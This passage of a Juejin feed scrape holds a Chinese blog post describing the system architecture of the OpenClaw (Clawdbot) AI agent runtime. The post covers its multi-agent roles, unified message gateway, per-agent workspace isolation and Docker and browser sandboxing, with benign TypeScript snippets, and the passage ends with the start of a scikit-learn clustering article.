<p>更多内容，欢迎关注【子昕AI编程】微信公众号！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw（Clawdbot） 技术架构：系统设计]]></title>    <link>https://juejin.cn/post/7602211941512691766</link>    <guid>https://juejin.cn/post/7602211941512691766</guid>    <pubDate>2026-02-03T04:40:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602211941512691766" data-draft-id="7600989427905921078" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw（Clawdbot） 技术架构：系统设计"/> <meta itemprop="keywords" content="人工智能,Python"/> <meta itemprop="datePublished" content="2026-02-03T04:40:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="两万五千个小时"/> <meta itemprop="url" content="https://juejin.cn/user/3966693682971870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw（Clawdbot） 技术架构：系统设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3966693682971870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    两万五千个小时
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:40:51.000Z" title="Tue Feb 03 2026 04:40:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>OpenClaw 技术博客系列</strong>
0. <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">技术架构：从工程痛点到系统设计</a> ← 当前</p>
<ol>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">Agent Runtime 深度解析</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">通用网关与多渠道架构</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">技能系统与工作流引擎</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">业务架构与 UI 层设计</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">部署架构与性能优化</a></li>
</ol>
</blockquote>
<h2 data-id="heading-0">OpenClaw（Clawdbot） 技术架构：系统设计</h2>
<blockquote>
<p><strong>项目命名历史</strong>
OpenClaw 项目在发展过程中经历了两次更名：最初命名为 <strong>Clawdbot</strong>，后更名为 <strong>Moltbot</strong>，最终定名为 <strong>OpenClaw</strong>。本文档中的所有技术架构和设计理念均适用于项目的完整演进历程。</p>
</blockquote>
<h3 data-id="heading-1">1. OpenClaw 的技术创新与产品特性</h3>
<p>OpenClaw 在 AI Agent 领域的快速崛起，源于其在系统架构和工程实践上的多项技术创新。它不是简单的聊天机器人，而是一个<strong>生产级 AI 智能体运行时平台</strong>。</p>
<h4 data-id="heading-2">1.1 从"对话界面"到"运行时平台"的范式转移</h4>
<p><strong>核心差异</strong>：大多数 AI 助手（ChatGPT、Claude）本质上是对话界面，而 OpenClaw 被定义为 <strong>Agent Runtime Platform</strong>。</p>
<p><strong>技术实现</strong>：</p>
<ul>
<li><strong>深度环境集成</strong>：直接访问文件系统、Git、Bash、Docker，无需复杂的云端环境配置</li>
<li><strong>完整项目理解</strong>：通过 Glob/Grep 工具快速索引代码库，理解项目结构和依赖关系</li>
<li><strong>自主执行能力</strong>：不仅回答问题，还能修改代码、运行测试、创建 PR</li>
</ul>
<p><strong>实际案例</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">用户: "重构认证系统使用 JWT"
传统 Agent: 提供代码示例和步骤说明
OpenClaw:
<span class="hljs-bullet">  1.</span> 搜索现有认证代码（Explore Agent）
<span class="hljs-bullet">  2.</span> 生成重构计划（Plan Agent）
<span class="hljs-bullet">  3.</span> 安装依赖 npm install jsonwebtoken
<span class="hljs-bullet">  4.</span> 修改代码文件
<span class="hljs-bullet">  5.</span> 运行测试验证
<span class="hljs-bullet">  6.</span> 创建 git commit
</code></pre>
<h4 data-id="heading-3">1.2 本地优先 (Local-First) 的工程范式</h4>
<p><strong>设计理念</strong>：在用户本地环境运行，所有数据保留在本地。</p>
<p><strong>技术优势</strong>：</p>
<ul>
<li><strong>数据隐私</strong>：代码和会话历史不离开用户机器，完全由用户掌控</li>
<li><strong>零网络延迟</strong>：本地执行工具调用，P99 延迟 &lt; 100ms（vs 云端 500ms+）</li>
<li><strong>离线工作</strong>：配合本地 LLM（Ollama）可完全离线运行</li>
<li><strong>成本控制</strong>：使用本地模型无 API 费用</li>
</ul>
<p><strong>架构实现</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">~/.OpenClaw/
├── agents/           <span class="hljs-comment"># 每个 Agent 独立工作区</span>
├── sessions/         <span class="hljs-comment"># 会话历史（JSONL 格式）</span>
├── credentials/      <span class="hljs-comment"># 凭证存储（加密）</span>
└── config.json       <span class="hljs-comment"># 全局配置</span>
</code></pre>
<h4 data-id="heading-4">1.3 多智能体协作 (Multi-Agent Collaboration)</h4>
<p><strong>设计模式</strong>：采用专业化智能体分工，而非单一模型处理所有任务。</p>
<p><strong>智能体类型</strong>：</p>
<ul>
<li><strong>Main Agent</strong>：任务理解、拆解与委派</li>
<li><strong>Explore Agent</strong>：代码搜索与架构分析（只读模式）</li>
<li><strong>Plan Agent</strong>：方案设计与步骤规划（不执行代码）</li>
<li><strong>Bash Agent</strong>：系统命令执行与测试运行</li>
</ul>
<p><strong>协作优势</strong>：</p>
<ul>
<li><strong>提高成功率</strong>：专业化分工避免 Agent 在复杂任务中迷失方向</li>
<li><strong>安全隔离</strong>：不同 Agent 有不同的工具访问权限</li>
<li><strong>并行执行</strong>：多个 Explore Agent 可同时分析不同模块</li>
</ul>
<p><strong>性能数据</strong>：</p>
<ul>
<li>复杂任务成功率提升 40%（vs 单一 Agent）</li>
<li>平均任务完成时间减少 30%（通过并行执行）</li>
</ul>
<h4 data-id="heading-5">1.4 通用网关与多渠道触达 (Universal Gateway)</h4>
<p><strong>技术创新</strong>：打破 Agent 只能存在于网页或 IDE 的局限。</p>
<p><strong>支持渠道</strong>：</p>
<ul>
<li><strong>终端 CLI</strong>：开发者主战场</li>
<li><strong>消息平台</strong>：Telegram、Discord、Slack、飞书、钉钉</li>
<li><strong>Web 仪表板</strong>：完整的管理界面</li>
<li><strong>macOS 应用</strong>：原生菜单栏应用</li>
</ul>
<p><strong>协议抽象</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 所有渠道消息归一化为标准格式</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StandardMessage</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">channelType</span>: <span class="hljs-string">'telegram'</span> | <span class="hljs-string">'discord'</span> | <span class="hljs-string">'slack'</span> | <span class="hljs-string">'cli'</span>;
  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">string</span>;        <span class="hljs-comment">// 统一用户 ID（跨平台）</span>
  <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">metadata</span>: { <span class="hljs-attr">platform</span>: <span class="hljs-built_in">string</span>; };
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<ul>
<li>下班路上在 Telegram 上让 Agent 跑测试</li>
<li>回到公司在终端查看结果</li>
<li>在 Discord 上与团队分享 Agent 的分析报告</li>
</ul>
<h4 data-id="heading-6">1.5 工业级安全与可观测性</h4>
<p><strong>安全机制</strong>：</p>
<ol>
<li>
<p><strong>沙箱隔离</strong>：</p>
<ul>
<li>Docker Sandbox：高风险代码在隔离容器中执行</li>
<li>Browser Sandbox：网页交互在独立浏览器上下文中运行</li>
<li>资源限制：内存、CPU、网络严格控制</li>
</ul>
</li>
<li>
<p><strong>工作区隔离</strong>：</p>
<ul>
<li>每个 Agent 实例独立文件系统</li>
<li>文件操作自动限制在工作区内</li>
<li>防止 Agent 间相互干扰</li>
</ul>
</li>
<li>
<p><strong>权限控制</strong>：</p>
<ul>
<li>Explore Agent：只读权限</li>
<li>Plan Agent：不能执行代码</li>
<li>Bash Agent：命令执行权限</li>
</ul>
</li>
</ol>
<p><strong>可观测性</strong>：</p>
<ul>
<li><strong>思维链透明化</strong>：用户可看到 Agent "思考"过程</li>
<li><strong>会话回放</strong>：JSONL 格式记录所有决策和工具调用</li>
<li><strong>调试友好</strong>：完整的执行日志和错误堆栈</li>
</ul>
<h3 data-id="heading-7">2. OpenClaw 的架构解决方案</h3>
<h4 data-id="heading-8">2.1 系统架构</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/355bb9246ea343a98c5392f75290b9f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lik5LiH5LqU5Y2D5Liq5bCP5pe2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698454&amp;x-signature=XUiq9gKMZi%2BGbW%2Bkis2uHFzVzuI%3D" alt="image.png" loading="lazy"/></p>
<p><strong>关键设计</strong>：</p>
<ul>
<li><strong>Gateway 层</strong>：处理高并发连接（10K+ WebSocket），使用事件驱动架构（Go goroutines 或 Node.js EventLoop）</li>
<li><strong>Runtime 层</strong>：专注于 CPU 密集型推理，可独立扩展（多实例负载均衡）</li>
<li><strong>通信协议</strong>：Gateway ↔ Runtime 使用 HTTP/gRPC，支持跨机器部署</li>
</ul>
<h4 data-id="heading-9">2.2 协议抽象：统一消息模型</h4>
<p>所有渠道（Telegram、Discord、Slack、CLI）的消息被归一化为标准格式：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">StandardMessage</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;                    <span class="hljs-comment">// 全局唯一消息 ID</span>
  <span class="hljs-attr">channelType</span>: <span class="hljs-string">'telegram'</span> | <span class="hljs-string">'discord'</span> | <span class="hljs-string">'slack'</span> | <span class="hljs-string">'cli'</span>;
  <span class="hljs-attr">channelId</span>: <span class="hljs-built_in">string</span>;             <span class="hljs-comment">// 渠道内的会话 ID</span>
  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">string</span>;                <span class="hljs-comment">// 统一用户 ID（跨平台）</span>
  <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>;               <span class="hljs-comment">// 消息内容</span>
  attachments?: <span class="hljs-title class_">Attachment</span>[];    <span class="hljs-comment">// 附件（图片、文件）</span>
  <span class="hljs-attr">metadata</span>: {
    <span class="hljs-attr">platform</span>: <span class="hljs-built_in">string</span>;            <span class="hljs-comment">// 原始平台标识</span>
    <span class="hljs-attr">rawMessage</span>: <span class="hljs-built_in">any</span>;             <span class="hljs-comment">// 原始消息对象（调试用）</span>
  };
}
</code></pre>
<p><strong>优势</strong>：</p>
<ul>
<li>业务逻辑与平台解耦（Agent 无需关心消息来源）</li>
<li>新增渠道只需实现 <code>ChannelPlugin</code> 接口</li>
<li>统一的用户身份系统（支持跨平台绑定）</li>
</ul>
<h4 data-id="heading-10">2.3 工作区隔离：每个 Agent 独立文件系统</h4>
<pre><code class="hljs language-bash" lang="bash">~/.OpenClaw/
├── agents/
│   ├── agent-001/              <span class="hljs-comment"># Agent 1 的工作区</span>
│   │   ├── sessions/           <span class="hljs-comment"># 会话历史（JSONL）</span>
│   │   ├── memory/             <span class="hljs-comment"># 长期记忆</span>
│   │   ├── files/              <span class="hljs-comment"># 工作文件</span>
│   │   └── config.json         <span class="hljs-comment"># Agent 配置</span>
│   └── agent-002/              <span class="hljs-comment"># Agent 2 的工作区</span>
│       └── ...
├── credentials/                <span class="hljs-comment"># 凭证存储（加密）</span>
└── config.json                 <span class="hljs-comment"># 全局配置</span>
</code></pre>
<p><strong>隔离机制</strong>：</p>
<ul>
<li>每个 Agent 有独立的 <code>cwd</code>（工作目录）</li>
<li>文件操作自动限制在工作区内</li>
<li>会话历史以 JSONL 格式持久化（支持增量写入）</li>
</ul>
<h4 data-id="heading-11">2.4 沙箱执行：Docker + Browser Sandbox</h4>
<p><strong>Docker Sandbox</strong>（高风险代码执行）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在隔离容器中执行 Bash 命令</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> dockerSandbox.<span class="hljs-title function_">execute</span>(<span class="hljs-string">'npm install lodash'</span>, {
  <span class="hljs-attr">image</span>: <span class="hljs-string">'node:22-alpine'</span>,
  <span class="hljs-attr">memoryLimit</span>: <span class="hljs-number">512</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>,  <span class="hljs-comment">// 512MB</span>
  <span class="hljs-attr">cpuQuota</span>: <span class="hljs-number">50000</span>,                  <span class="hljs-comment">// 50% CPU</span>
  <span class="hljs-attr">networkMode</span>: <span class="hljs-string">'none'</span>,              <span class="hljs-comment">// 禁用网络</span>
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">30000</span>,                   <span class="hljs-comment">// 30s 超时</span>
});
</code></pre>
<p><strong>Browser Sandbox</strong>（网页交互）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在隔离浏览器上下文中执行脚本</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> browserSandbox.<span class="hljs-title function_">execute</span>(<span class="hljs-string">`
  return document.querySelector('.price').textContent;
`</span>, {
  <span class="hljs-attr">url</span>: <span class="hljs-string">'https://example.com'</span>,
  <span class="hljs-attr">permissions</span>: [],                  <span class="hljs-comment">// 禁用所有权限</span>
  <span class="hljs-attr">viewport</span>: { <span class="hljs-attr">width</span>: <span class="hljs-number">1280</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">720</span> },
});
</code></pre>
<p><strong>安全特性</strong>：</p>
<ul>
<li>只读文件系统（防止恶意写入）</li>
<li>资源限制（内存、CPU、网络）</li>
<li>自动清理（容器执行后立即销毁）</li>
</ul>
<h3 data-id="heading-12">3. 多智能体协作架构</h3>
<p>OpenClaw 采用专业化智能体分工模式：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a567f59923bf489d926f4d07278dcabf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lik5LiH5LqU5Y2D5Liq5bCP5pe2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698454&amp;x-signature=FC8YW5KESmvmLEmhXu28U6GexxI%3D" alt="agent.png" loading="lazy"/></p>
<p><strong>协作模式</strong>：</p>
<ol>
<li>
<p><strong>委派模式</strong>（Delegation）：
用户: "重构认证系统使用 JWT"
Main Agent → Plan Agent: 生成实现计划
Plan Agent → Main Agent: 返回 5 步计划
Main Agent → Bash Agent: 安装依赖
Main Agent: 执行代码修改
Main Agent → Bash Agent: 运行测试</p>
</li>
<li>
<p><strong>流水线模式</strong>（Pipeline）：
Explore Agent → Plan Agent → Main Agent → Bash Agent
(搜索代码)   (设计方案)   (实现功能)   (验证测试)</p>
</li>
<li>
<p><strong>并行模式</strong>（Parallel）：
Main Agent 同时委派：
├─ Explore Agent: 分析前端性能
├─ Explore Agent: 分析后端性能
└─ Bash Agent: 运行性能测试</p>
</li>
</ol>
<p><strong>工具访问控制</strong>：</p>
<ul>
<li>Explore Agent：只读（Glob, Grep, Read）</li>
<li>Plan Agent：只读 + 不能递归调用 Task</li>
<li>Bash Agent：命令执行（Bash）</li>
<li>Main Agent：完整工具集</li>
</ul>
<h3 data-id="heading-13">4. 技术借鉴点</h3>
<p>如果你正在构建类似系统，以下设计值得借鉴：</p>
<h4 data-id="heading-14">4.1 统一协议抽象</h4>
<p><strong>问题</strong>：多平台消息格式不一致。</p>
<p><strong>方案</strong>：定义标准消息接口 + 适配器模式。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ChannelPlugin</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">initialize</span>(<span class="hljs-attr">deps</span>: <span class="hljs-title class_">Dependencies</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;;
  <span class="hljs-title function_">sendMessage</span>(<span class="hljs-attr">target</span>: <span class="hljs-title class_">Target</span>, <span class="hljs-attr">message</span>: <span class="hljs-title class_">Message</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;;
  <span class="hljs-title function_">onMessage</span>(<span class="hljs-attr">handler</span>: <span class="hljs-title class_">MessageHandler</span>): <span class="hljs-built_in">void</span>;
}
</code></pre>
<h4 data-id="heading-15">4.2 状态机持久化</h4>
<p><strong>问题</strong>：Agent 状态丢失。</p>
<p><strong>方案</strong>：JSONL 增量写入 + 事件溯源。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 每个事件追加一行</span>
{ <span class="hljs-string">"type"</span>: <span class="hljs-string">"user_message"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"..."</span>, <span class="hljs-string">"timestamp"</span>: <span class="hljs-number">1234567890</span> }
{ <span class="hljs-string">"type"</span>: <span class="hljs-string">"thinking"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"..."</span>, <span class="hljs-string">"timestamp"</span>: <span class="hljs-number">1234567891</span> }
{ <span class="hljs-string">"type"</span>: <span class="hljs-string">"tool_call"</span>, <span class="hljs-string">"tool"</span>: <span class="hljs-string">"read_file"</span>, <span class="hljs-string">"args"</span>: {...}, <span class="hljs-string">"timestamp"</span>: <span class="hljs-number">1234567892</span> }
</code></pre>
<h4 data-id="heading-16">4.3 工作区隔离</h4>
<p><strong>问题</strong>：多 Agent 文件冲突。</p>
<p><strong>方案</strong>：独立目录 + 路径沙箱。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 自动限制文件操作在工作区内</span>
<span class="hljs-keyword">const</span> workspace = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Workspace</span>(<span class="hljs-string">'/home/user/.openclaw/agents/agent-001'</span>);
<span class="hljs-keyword">await</span> workspace.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'data.json'</span>);  <span class="hljs-comment">// 实际路径: /home/user/.openclaw/agents/agent-001/data.json</span>
</code></pre>
<h4 data-id="heading-17">4.4 分层架构</h4>
<p><strong>问题</strong>：业务逻辑与基础设施耦合。</p>
<p><strong>方案</strong>：清晰的层次边界 + 依赖注入。</p>
<pre><code class="hljs language-java" lang="java">Presentation <span class="hljs-title function_">Layer</span> <span class="hljs-params">(CLI, Web, Mobile)</span>
         ↓
Access <span class="hljs-title function_">Layer</span> <span class="hljs-params">(Gateway, API Server)</span>
         ↓
Business <span class="hljs-title function_">Layer</span> <span class="hljs-params">(Agent Orchestrator, Command Handlers)</span>
         ↓
Service <span class="hljs-title function_">Layer</span> <span class="hljs-params">(Model Service, Memory Service)</span>
         ↓
Tool <span class="hljs-title function_">Layer</span> <span class="hljs-params">(File Tools, Git Tools, Code Tools)</span>
         ↓
Data <span class="hljs-title function_">Layer</span> <span class="hljs-params">(File System, Session Store)</span>
</code></pre>
<h3 data-id="heading-18">5. 总结</h3>
<p>OpenClaw 的架构设计围绕以下核心原则：</p>
<ol>
<li><strong>物理分离</strong>：Gateway（I/O）与 Runtime（计算）解耦</li>
<li><strong>协议抽象</strong>：统一消息模型屏蔽平台差异</li>
<li><strong>安全隔离</strong>：沙箱执行 + 工作区隔离</li>
<li><strong>状态持久化</strong>：JSONL 增量写入 + 事件溯源</li>
<li><strong>专业化分工</strong>：多智能体协作模式</li>
</ol>
<p>这些设计使 OpenClaw 不仅是一个聊天机器人，而是一个<strong>生产级 AI 智能体运行时平台</strong>。</p>
<hr/>
<p><strong>下一篇</strong>：<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">Agent Runtime 深度解析</a> - 探索工作区隔离、会话管理和事件驱动架构的实现细节。</p>
<p><strong>参考资源</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenclaw%2Fopenclaw" target="_blank" title="https://github.com/openclaw/openclaw" ref="nofollow noopener noreferrer">OpenClaw GitHub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.clawd.bot" target="_blank" title="https://docs.clawd.bot" ref="nofollow noopener noreferrer">官方文档</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【技术专题】Scikit-learn Python机器学习 - 聚类分析算法之Agglomerative Clustering（凝聚层次聚类）]]></title>    <link>https://juejin.cn/post/7602259669730476059</link>    <guid>https://juejin.cn/post/7602259669730476059</guid>    <pubDate>2026-02-03T04:16:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669730476059" data-draft-id="7602303923140280370" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【技术专题】Scikit-learn Python机器学习 - 聚类分析算法之Agglomerative Clustering（凝聚层次聚类）"/> <meta itemprop="keywords" content="人工智能,机器学习,Python"/> <meta itemprop="datePublished" content="2026-02-03T04:16:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小锋java1234"/> <meta itemprop="url" content="https://juejin.cn/user/4152222342709933"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【技术专题】Scikit-learn Python机器学习 - 聚类分析算法之Agglomerative Clustering（凝聚层次聚类）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4152222342709933/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小锋java1234
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:16:27.000Z" title="Tue Feb 03 2026 04:16:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
